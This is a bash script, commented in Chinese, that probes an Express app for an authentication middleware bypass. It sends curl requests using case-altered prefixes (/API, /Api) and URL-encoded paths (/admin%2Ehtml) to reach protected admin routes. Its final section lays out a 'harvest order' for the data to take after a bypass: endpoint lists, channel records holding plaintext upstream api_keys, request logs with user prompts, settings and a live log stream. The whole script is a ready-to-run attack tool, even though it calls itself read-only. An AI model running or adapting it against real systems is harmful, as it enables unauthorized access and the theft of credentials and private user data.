#!/usr/bin/env bash
# Express 鉴权中间件「路径判定」绕过验证脚本（只读，不改动目标）
# 原理：中间件用未解码 / 大小写敏感的 req.path 做前缀或精确匹配判定鉴权，
#       而 Express 路由默认 caseSensitive:false，且路由匹配前会 URL 解码
#       -> 变体路径绕过中间件，仍命中真实路由。
# 用法：T=http://host:port bash express_auth_bypass.sh

T="${T:?set T=http://host:port}"
U='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.30 Safari/537.36'

echo "== 1. 基线（应被拦截/重定向）=="
curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  /api/admin/channel-types -> %{http_code}\n" "$T/api/admin/channel-types"
curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  /admin.html              -> %{http_code}\n" "$T/admin.html"

echo "== 2. 大小写变体前缀（命中率最高）=="
for p in /API /Api /aPI /aPi; do
  curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  $p/admin/channel-types -> %{http_code}\n" "$T$p/admin/channel-types"
done

echo "== 3. 静态页 URL 编码变体（取被中间件保护的页面）=="
for p in "/admin%2Ehtml" "/admin%2ehtml" "/admin.htm%6c" "/admin%2Ecss"; do
  curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  $p -> %{http_code} (%{size_download}B)\n" "$T$p"
done

echo "== 4. 其它常见变体（多为 404，Express 不把 %2F 当分隔符）=="
for p in "/api%2Fadmin" "//api/admin" "/api./admin" "/api/admin%2F" "/%61pi/admin" "/api/admin;x" "/api/admin/"; do
  curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  $p -> %{http_code}\n" "$T$p"
done

echo "== 5. 命中后的收割顺序（全部 GET 只读）=="
# 先读前端拿端点清单，再逐个打 —— 比盲枚举准确得多
# /admin%2Ehtml                          -> 管理页 HTML（含 <script src=/assets/...>）
# /assets/admin-common.js                -> 完整 API 清单
# /assets/pages/*.js                     -> 各页面调用的接口
# /API/admin/channel-types               -> 渠道类型定义
# /API/admin/channels                    -> 渠道 + 上游 api_keys 明文
# /API/admin/stats                       -> 渠道调用统计
# /API/admin/settings                    -> 系统配置
# /API/admin/request-logs                -> 请求日志（含 prompt）
# /API/admin/generations                 -> 生成记录
# /API/logs/stream                       -> SSE 实时日志流
